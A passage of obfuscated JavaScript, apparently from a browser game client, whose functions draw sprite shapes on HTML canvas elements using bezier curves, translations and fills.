			Δ.bezierCurveTo(167 * ᐃ, 325 * ᐃ, ᐃ * 191, 405 * ᐃ, ᐃ * 202, 502 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 180, ᐃ * 503, 180 * ᐃ, 503 * ᐃ, ᐃ * 158, ᐃ * 504);
			Δ.bezierCurveTo(135 * ᐃ, 396 * ᐃ, 134 * ᐃ, 185 * ᐃ, 175 * ᐃ, ᐃ * 119);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 110, 518 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 111.5, ᐃ * 533, 111.5 * ᐃ, ᐃ * 533, 113 * ᐃ, 548 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 162.5, 544 * ᐃ, 162.5 * ᐃ, 544 * ᐃ, ᐃ * 212, 540 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 312, ᐃ * 535, 281 * ᐃ, ᐃ * 665, 225 * ᐃ, ᐃ * 665);
			Δ.bezierCurveTo(227 * ᐃ, 686.5 * ᐃ, ᐃ * 227, 686.5 * ᐃ, 229 * ᐃ, ᐃ * 708);
			Δ.bezierCurveTo(343 * ᐃ, 684 * ᐃ, 354 * ᐃ, 496 * ᐃ, ᐃ * 222, ᐃ * 498);
			Δ.bezierCurveTo(ᐃ * 165.5, ᐃ * 503, ᐃ * 165.5, ᐃ * 503, 109 * ᐃ, ᐃ * 508);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆ]);
			ⵠᐃᐃ(Δ, ᐃ * 204, 693 * ᐃ, ᐃ * 36.013886210738214);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			ⵠᐃᐃ(Δ, 105 * ᐃ, ᐃ * 518, ᐃ * 30);
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⲆᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 171, ᐃ * 535);
			Δ.bezierCurveTo(139.5 * ᐃ, ᐃ * 537.5, 139.5 * ᐃ, ᐃ * 537.5, 108 * ᐃ, 540 * ᐃ);
			Δ.bezierCurveTo(110 * ᐃ, 527.5 * ᐃ, ᐃ * 110, 527.5 * ᐃ, 112 * ᐃ, 515 * ᐃ);
			Δ.bezierCurveTo(148 * ᐃ, ᐃ * 513, 148 * ᐃ, 513 * ᐃ, 184 * ᐃ, 511 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(244 * ᐃ, ᐃ * 669);
			Δ.bezierCurveTo(248.5 * ᐃ, 680 * ᐃ, ᐃ * 248.5, 680 * ᐃ, ᐃ * 253, ᐃ * 691);
			Δ.bezierCurveTo(239.5 * ᐃ, 697 * ᐃ, ᐃ * 239.5, 697 * ᐃ, ᐃ * 226, ᐃ * 703);
			Δ.bezierCurveTo(223 * ᐃ, ᐃ * 691.5, ᐃ * 223, ᐃ * 691.5, ᐃ * 220, ᐃ * 680);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠ]);
			Δ.translate(ᐃ * -25, -25 * ᐃ);
			Δ.globalAlpha = ᐃΔᐃⲆ;
			Δ.save();
			Δ.translate(ᐃ * 193.5, 602.5 * ᐃ);
			Δ.rotate(-.12);
			Ⲇᐃᐃ(Δ, ᐃ * -26.5, ᐃ * -97.5, 53 * ᐃ, ᐃ * 195, 25 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ΔⵠᐃⲆ], ᐃ * ΔΔᐃᐃⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(137 * ᐃ, 519 * ᐃ);
			Δ.bezierCurveTo(182 * ᐃ, 513 * ᐃ, ᐃ * 182, 513 * ᐃ, 227 * ᐃ, ᐃ * 507);
			Δ.bezierCurveTo(214 * ᐃ, 417 * ᐃ, ᐃ * 189, ᐃ * 304, 221 * ᐃ, 180 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 191, 126 * ᐃ, ᐃ * 192, 105 * ᐃ, ᐃ * 198, ᐃ * 64);
			Δ.bezierCurveTo(ᐃ * 123, 102 * ᐃ, ᐃ * 99, ᐃ * 285, ᐃ * 137, ᐃ * 517);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⲆⵠᐃⲆ], ᐃ * 16);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
			Δ.moveTo(ᐃ * 175, ᐃ * 119);
			Δ.bezierCurveTo(ᐃ * 176, ᐃ * 142, ᐃ * 184, 165 * ᐃ, ᐃ * 197, ᐃ * 183);
			Δ.bezierCurveTo(167 * ᐃ, ᐃ * 325, ᐃ * 191, 405 * ᐃ, 202 * ᐃ, ᐃ * 502);
			Δ.bezierCurveTo(180 * ᐃ, 503 * ᐃ, 180 * ᐃ, 503 * ᐃ, ᐃ * 158, 504 * ᐃ);
			Δ.bezierCurveTo(135 * ᐃ, 396 * ᐃ, 134 * ᐃ, ᐃ * 185, ᐃ * 175, 119 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(110 * ᐃ, ᐃ * 518);
			Δ.bezierCurveTo(111.5 * ᐃ, 533 * ᐃ, ᐃ * 111.5, ᐃ * 533, 113 * ᐃ, 548 * ᐃ);
			Δ.bezierCurveTo(162.5 * ᐃ, 544 * ᐃ, 162.5 * ᐃ, 544 * ᐃ, ᐃ * 212, 540 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 312, 535 * ᐃ, 281 * ᐃ, 665 * ᐃ, 225 * ᐃ, 665 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 227, ᐃ * 686.5, 227 * ᐃ, ᐃ * 686.5, 229 * ᐃ, 708 * ᐃ);
			Δ.bezierCurveTo(343 * ᐃ, 684 * ᐃ, ᐃ * 354, ᐃ * 496, ᐃ * 222, ᐃ * 498);
			Δ.bezierCurveTo(165.5 * ᐃ, 503 * ᐃ, 165.5 * ᐃ, 503 * ᐃ, 109 * ᐃ, ᐃ * 508);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠⵠⲆΔ], Ⲇᐃ[Ⲇᐃⵠᐃ], ⲆⲆⲆΔΔ * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 204, 693 * ᐃ, 36.013886210738214 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[4], 16 * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 105, 518 * ᐃ, ᐃ * 30);
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[ⵠⲆⵠᐃ], 16 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 171, ᐃ * 535);
			Δ.bezierCurveTo(139.5 * ᐃ, 537.5 * ᐃ, 139.5 * ᐃ, 537.5 * ᐃ, 108 * ᐃ, ᐃ * 540);
			Δ.bezierCurveTo(ᐃ * 110, ᐃ * 527.5, 110 * ᐃ, 527.5 * ᐃ, ᐃ * 112, ᐃ * 515);
			Δ.bezierCurveTo(148 * ᐃ, 513 * ᐃ, 148 * ᐃ, 513 * ᐃ, 184 * ᐃ, ᐃ * 511);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 244, ᐃ * 669);
			Δ.bezierCurveTo(248.5 * ᐃ, ᐃ * 680, 248.5 * ᐃ, 680 * ᐃ, 253 * ᐃ, ᐃ * 691);
			Δ.bezierCurveTo(239.5 * ᐃ, ᐃ * 697, 239.5 * ᐃ, 697 * ᐃ, ᐃ * 226, ᐃ * 703);
			Δ.bezierCurveTo(223 * ᐃ, 691.5 * ᐃ, ᐃ * 223, ᐃ * 691.5, ᐃ * 220, ᐃ * 680);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6]);
			ⵠᐃᐃ(Δ, ᐃ * 204, 693 * ᐃ, ᐃ * 17.029386365926403);
			ΔⲆ(Δ, Ⲇᐃ[7]);
			ⵠᐃᐃ(Δ, 106 * ᐃ, ᐃ * 518, ⵠⲆΔΔᐃ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[7]);
			return Ⲇⵠ
		}

		function ᐃⵠⲆᐃΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = ᐃ * 105;
			var ⵠⵠᐃ = 125 * ᐃ;
			var ⵠⲆⵠ = ᐃ * 4;
			var w2 = ᐃⵠⵠ / ⵠⲆⵠⲆ;
			var ΔΔⵠⲆᐃ = ⵠⵠᐃ / 2;
			var ΔⵠΔΔ = ᐃ * ᐃΔᐃΔⲆ;
			var ᐃⵠΔⲆ = ⵠⵠΔⵠ * ᐃ;
			var ⲆⲆⵠΔΔⵠΔ = 10 * ᐃ;
			var ⲆᐃᐃⲆⵠⲆⲆ = 110 * ᐃ;
			var ⵠᐃⲆⵠᐃⵠⵠ = ⲆⲆⵠΔΔⵠΔ / 2;
			var ᐃⲆⲆᐃⵠΔⵠ = ⲆᐃᐃⲆⵠⲆⲆ / 2;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.save();
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(ᐃⵠⵠ / 2 + ᐃ * ⵠⲆΔⵠᐃ, ⵠⵠᐃ / 2 + ᐃⵠΔⲆ);
			Ⲇᐃᐃ(Δ, -ⵠᐃⲆⵠᐃⵠⵠ, -ᐃⲆⲆᐃⵠΔⵠ, ⲆⲆⵠΔΔⵠΔ, ⲆᐃᐃⲆⵠⲆⲆ, ΔⵠΔΔ);
			ᐃΔⲆΔ ? ΔⲆ(Δ, Ⲇᐃ[0]) : ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔ]);
			Δ.translate(-130 * ᐃ + ᐃⵠΔⲆ, -128 * ᐃ + ᐃⵠΔⲆ);
			Δ.beginPath();
			Δ.bezierCurveTo(ᐃ * 159, 93 * ᐃ, 156 * ᐃ, ᐃ * 99, ᐃ * 154, 102 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 128, 92 * ᐃ, 90 * ᐃ, 93 * ᐃ, ᐃ * 72, ᐃ * 96);
			Δ.bezierCurveTo(68 * ᐃ, 84 * ᐃ, 143 * ᐃ, 73 * ᐃ, 162 * ᐃ, 86 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆⲆⲆ]);
			Δ.restore();
			Δ.translate(ᐃⵠⵠ / 2 + 8, ⵠⵠᐃ / 2);
			Δ.globalAlpha = ⵠΔⲆ;
			Ⲇᐃᐃ(Δ, -ⵠᐃⲆⵠᐃⵠⵠ, -ᐃⲆⲆᐃⵠΔⵠ, ⲆⲆⵠΔΔⵠΔ, ⲆᐃᐃⲆⵠⲆⲆ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆΔⵠ], Ⲇᐃ[4], ⵠⲆⵠ);
			Δ.translate(-130 * ᐃ, -125 * ᐃ);
			Δ.beginPath();
			Δ.bezierCurveTo(159 * ᐃ, ᐃ * 93, 156 * ᐃ, 99 * ᐃ, ᐃ * 154, 102 * ᐃ);
			Δ.bezierCurveTo(128 * ᐃ, 92 * ᐃ, 90 * ᐃ, ᐃ * 93, ᐃ * 72, ᐃ * 96);
			Δ.bezierCurveTo(ᐃ * 68, ᐃ * 84, ᐃ * 143, 73 * ᐃ, ᐃ * 162, 86 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⵠⵠ], Ⲇᐃ[6], ⵠⲆⵠ);
			return Ⲇⵠ
		}

		function ΔΔᐃⵠⲆⵠᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 170 * ᐃ;
			Ⲇⵠ.height = 469 * ᐃ;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ⵠᐃⵠΔ;
			Δ.translate(ᐃ * ⲆⵠᐃᐃⲆ, ᐃ * ᐃΔᐃⲆⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 88, 30 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 96, 49.5 * ᐃ, 96 * ᐃ, ᐃ * 49.5, ᐃ * 104, 69 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 105.5, ᐃ * 41.5, ᐃ * 105.5, ᐃ * 41.5, ᐃ * 107, 14 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 114, ᐃ * 9.5, 114 * ᐃ, 9.5 * ᐃ, ᐃ * 121, ᐃ * ⵠᐃΔⵠ);
			Δ.bezierCurveTo(135.5 * ᐃ, 27.5 * ᐃ, ᐃ * 135.5, 27.5 * ᐃ, ᐃ * 150, 50 * ᐃ);
			Δ.bezierCurveTo(110.5 * ᐃ, ᐃ * 286, 110.5 * ᐃ, ᐃ * 286, 103 * ᐃ, 331 * ᐃ);
			Δ.bezierCurveTo(69.5 * ᐃ, 325 * ᐃ, 69.5 * ᐃ, ᐃ * 325, 36 * ᐃ, ᐃ * 319);
			Δ.bezierCurveTo(ᐃ * 56.5, ᐃ * 180, 56.5 * ᐃ, ᐃ * 180, ᐃ * 77, 41 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 118, ᐃ * 31);
			Δ.bezierCurveTo(125 * ᐃ, ᐃ * 43, ᐃ * 125, 43 * ᐃ, 132 * ᐃ, 55 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 109.5, 185.5 * ᐃ, ᐃ * 109.5, 185.5 * ᐃ, ᐃ * 87, ᐃ * 316);
			Δ.bezierCurveTo(ᐃ * 72, ᐃ * 313.5, ᐃ * 72, 313.5 * ᐃ, 57 * ᐃ, 311 * ᐃ);
			Δ.bezierCurveTo(76.5 * ᐃ, ᐃ * 181, ᐃ * 76.5, ᐃ * 181, ᐃ * 96, ᐃ * 51);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(56 * ᐃ, ᐃ * 328);
			Δ.bezierCurveTo(47 * ᐃ, 385.5 * ᐃ, 47 * ᐃ, 385.5 * ᐃ, 38 * ᐃ, 443 * ᐃ);
			Δ.bezierCurveTo(52 * ᐃ, 446 * ᐃ, 52 * ᐃ, 446 * ᐃ, ᐃ * 66, ᐃ * 449);
			Δ.bezierCurveTo(76.5 * ᐃ, ᐃ * 388.5, ᐃ * 76.5, ᐃ * 388.5, ᐃ * 87, ᐃ * 328);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃΔΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(74 * ᐃ, 302 * ᐃ);
			Δ.bezierCurveTo(104 * ᐃ, ᐃ * 316.5, ᐃ * 104, 316.5 * ᐃ, ᐃ * 134, ᐃ * 331);
			Δ.bezierCurveTo(ᐃ * 133, 341 * ᐃ, 133 * ᐃ, 341 * ᐃ, 132 * ᐃ, 351 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 69.5, 342 * ᐃ, ᐃ * 69.5, ᐃ * 342, ᐃ * ᐃⵠⵠⵠΔ, ᐃ * 333);
			Δ.bezierCurveTo(ⵠⵠᐃΔⲆ * ᐃ, ᐃ * 323, 8 * ᐃ, ᐃ * 323, ᐃ * 9, 313 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆⵠ]);
			Δ.save();
			Δ.translate(51.5 * ᐃ, ᐃ * 440.5);
			Δ.rotate(.2);
			Ⲇᐃᐃ(Δ, -20.5 * ᐃ, -18.5 * ᐃ, ᐃ * 41, 37 * ᐃ, ᐃ * ⵠᐃⲆⲆΔ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
			Δ.moveTo(73 * ᐃ, ᐃ * 316);
			Δ.bezierCurveTo(ᐃ * 90, 324.5 * ᐃ, 90 * ᐃ, ᐃ * 324.5, 107 * ᐃ, ᐃ * 333);
			Δ.bezierCurveTo(70 * ᐃ, 327.5 * ᐃ, 70 * ᐃ, 327.5 * ᐃ, 33 * ᐃ, ᐃ * 322);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠⵠ]);
			Δ.globalAlpha = 1;
			Δ.translate(ᐃ * -20, ᐃ * -20);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(88 * ᐃ, ᐃ * 30);
			Δ.bezierCurveTo(96 * ᐃ, ᐃ * 49.5, ᐃ * 96, ᐃ * 49.5, 104 * ᐃ, 69 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 105.5, ᐃ * 41.5, 105.5 * ᐃ, ᐃ * 41.5, ᐃ * 107, ⲆᐃⵠⲆⵠᐃⵠ * ᐃ);
			Δ.bezierCurveTo(114 * ᐃ, ᐃ * 9.5, 114 * ᐃ, ᐃ * 9.5, 121 * ᐃ, ᐃ * ⵠⵠΔΔ);
			Δ.bezierCurveTo(135.5 * ᐃ, 27.5 * ᐃ, 135.5 * ᐃ, 27.5 * ᐃ, 150 * ᐃ, 50 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 110.5, ᐃ * 286, 110.5 * ᐃ, 286 * ᐃ, 103 * ᐃ, ᐃ * 331);
			Δ.bezierCurveTo(69.5 * ᐃ, ᐃ * 325, ᐃ * 69.5, ᐃ * 325, ᐃ * 36, 319 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 56.5, ᐃ * 180, 56.5 * ᐃ, ᐃ * 180, ᐃ * 77, ᐃ * 41);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃⲆⵠ], Ⲇᐃ[2], 7 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(ᐃ * 118, ᐃ * 31);
			Δ.bezierCurveTo(125 * ᐃ, 43 * ᐃ, 125 * ᐃ, 43 * ᐃ, 132 * ᐃ, ᐃ * 55);
			Δ.bezierCurveTo(ᐃ * 109.5, ᐃ * 185.5, 109.5 * ᐃ, ᐃ * 185.5, 87 * ᐃ, ᐃ * 316);
			Δ.bezierCurveTo(ᐃ * 72, 313.5 * ᐃ, ᐃ * 72, ᐃ * 313.5, ᐃ * 57, 311 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 76.5, 181 * ᐃ, 76.5 * ᐃ, 181 * ᐃ, ᐃ * 96, ᐃ * 51);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 88, 30 * ᐃ);
			Δ.bezierCurveTo(96 * ᐃ, ᐃ * 49.5, ᐃ * 96, ᐃ * 49.5, 104 * ᐃ, 69 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 105.5, 41.5 * ᐃ, 105.5 * ᐃ, 41.5 * ᐃ, 107 * ᐃ, 14 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 114, ᐃ * 9.5, ᐃ * 114, 9.5 * ᐃ, ᐃ * 121, ⲆⲆΔⵠ * ᐃ);
			Δ.bezierCurveTo(135.5 * ᐃ, ᐃ * 27.5, 135.5 * ᐃ, 27.5 * ᐃ, ᐃ * 150, 50 * ᐃ);
			Δ.bezierCurveTo(110.5 * ᐃ, ᐃ * 286, 110.5 * ᐃ, ᐃ * 286, ᐃ * 103, ᐃ * 331);
			Δ.bezierCurveTo(ᐃ * 69.5, 325 * ᐃ, ᐃ * 69.5, 325 * ᐃ, ᐃ * 36, ᐃ * 319);
			Δ.bezierCurveTo(ᐃ * 56.5, 180 * ᐃ, 56.5 * ᐃ, ᐃ * 180, 77 * ᐃ, ᐃ * 41);
			Δ.closePath();
			ΔⲆ(Δ, ⵠΔᐃⲆΔ, Ⲇᐃ[Δⵠⵠⵠ], 7 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 56, ᐃ * 328);
			Δ.bezierCurveTo(ᐃ * 47, 385.5 * ᐃ, ᐃ * 47, ᐃ * 385.5, 38 * ᐃ, 443 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 52, ᐃ * 446, ᐃ * 52, 446 * ᐃ, ᐃ * 66, 449 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 76.5, 388.5 * ᐃ, 76.5 * ᐃ, ᐃ * 388.5, 87 * ᐃ, ᐃ * 328);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ᐃᐃⲆᐃ], ᐃ * ΔΔᐃⲆⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(74 * ᐃ, ᐃ * 302);
			Δ.bezierCurveTo(ᐃ * 104, 316.5 * ᐃ, 104 * ᐃ, ᐃ * 316.5, ᐃ * 134, 331 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 133, ᐃ * 341, ᐃ * 133, ᐃ * 341, 132 * ᐃ, ᐃ * 351);
			Δ.bezierCurveTo(ᐃ * 69.5, ᐃ * 342, 69.5 * ᐃ, 342 * ᐃ, 7 * ᐃ, 333 * ᐃ);
			Δ.bezierCurveTo(8 * ᐃ, ᐃ * 323, 8 * ᐃ, 323 * ᐃ, ᐃ * 9, 313 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠᐃ], Ⲇᐃ[ΔⲆΔΔ], ⲆᐃᐃᐃΔ * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 51.5, ᐃ * 440.5);
			Δ.rotate(.2);
			Ⲇᐃᐃ(Δ, -20.5 * ᐃ, -18.5 * ᐃ, ᐃ * 41, ᐃ * 37, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[5], ⲆⲆⵠⲆⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 73, ᐃ * 316);
			Δ.bezierCurveTo(ᐃ * 90, ᐃ * 324.5, 90 * ᐃ, 324.5 * ᐃ, 107 * ᐃ, 333 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 70, 327.5 * ᐃ, 70 * ᐃ, 327.5 * ᐃ, 33 * ᐃ, 322 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6]);
			return Ⲇⵠ
		}

		function ᐃᐃΔⵠⵠΔΔ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 220 * ᐃ;
			var ⵠⵠᐃ = ᐃ * 220;
			var ⲆⲆⵠ = ᐃ * 32;
			var ⵠⲆⵠ = ᐃ * 4;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.translate(ᐃⵠⵠ / ⵠⵠΔⲆ, ⵠⵠᐃ / ᐃⵠⲆⲆⲆ + 10 * ᐃ);
			Δ.globalAlpha = .5;
			ⵠᐃᐃ(Δ, ΔΔⵠⵠ, 0, ⲆⲆⵠ);
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ⵠΔⲆⵠ]);
			Δ.translate(0, ᐃ * -8);
			Δ.globalAlpha = ΔⲆᐃᐃ;
			ⵠᐃᐃ(Δ, ᐃⵠⲆ, ⲆΔⵠ, ⲆⲆⵠ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ⵠⲆⵠ);
			return Ⲇⵠ
		}
		const ⲆⵠⲆᐃⵠⲆΔ = ⵠᐃⲆᐃΔⲆⵠ;
		const ⲆⵠⲆⲆᐃ = ⲆⵠⲆⵠⲆ;

		function ⲆⲆⲆᐃᐃΔⵠⵠᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 118;
			Ⲇⵠ.height = 114 * ᐃ;
			Δ.translate(ΔΔⵠⵠ, ᐃⵠᐃΔⵠ * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 42, ᐃ * 43, 24.758836806279895 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⲆᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(ᐃ * 65, ᐃ * 90);
			Δ.bezierCurveTo(ᐃ * 72, ᐃ * 91, ᐃ * 75, 92 * ᐃ, 71 * ᐃ, 96 * ᐃ);
			Δ.bezierCurveTo(65 * ᐃ, 98 * ᐃ, 65 * ᐃ, ᐃ * 94, 65 * ᐃ, ᐃ * 91);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 87, ᐃ * 45);
			Δ.bezierCurveTo(ᐃ * 108, ᐃ * 59, ΔᐃⵠⲆⲆ * ᐃ, 86 * ᐃ, ᐃ * 85, ᐃ * 91);
			Δ.bezierCurveTo(ᐃ * 80, ᐃ * 96, ᐃ * 68, 95 * ᐃ, 58 * ᐃ, 87 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 53, ᐃ * 80, 61 * ᐃ, ᐃ * 64, 66 * ᐃ, 58 * ᐃ);
			Δ.bezierCurveTo(73 * ᐃ, 48 * ᐃ, ᐃ * 78, 44 * ᐃ, 87 * ᐃ, 45 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.translate(0, ᐃ * -10);
			ⵠᐃᐃ(Δ, ᐃ * 42, 43 * ᐃ, 24.758836806279895 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * 5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(65 * ᐃ, ᐃ * 90);
			Δ.bezierCurveTo(72 * ᐃ, ᐃ * 91, ᐃ * 75, 92 * ᐃ, 71 * ᐃ, 96 * ᐃ);
			Δ.bezierCurveTo(65 * ᐃ, 98 * ᐃ, ᐃ * 65, 94 * ᐃ, 65 * ᐃ, 91 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃ], Ⲇᐃ[2], ⵠᐃⲆΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(87 * ᐃ, ᐃ * 45);
			Δ.bezierCurveTo(ᐃ * 108, ᐃ * 59, 100 * ᐃ, 86 * ᐃ, 85 * ᐃ, ᐃ * 91);
			Δ.bezierCurveTo(80 * ᐃ, ᐃ * 96, ᐃ * 68, 95 * ᐃ, 58 * ᐃ, ᐃ * 87);
			Δ.bezierCurveTo(ᐃ * 53, ᐃ * 80, 61 * ᐃ, ᐃ * 64, 66 * ᐃ, ᐃ * 58);
			Δ.bezierCurveTo(73 * ᐃ, 48 * ᐃ, 78 * ᐃ, 44 * ᐃ, 87 * ᐃ, ᐃ * 45);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆΔ], Ⲇᐃ[2], ᐃ * ᐃⲆⵠⵠ);
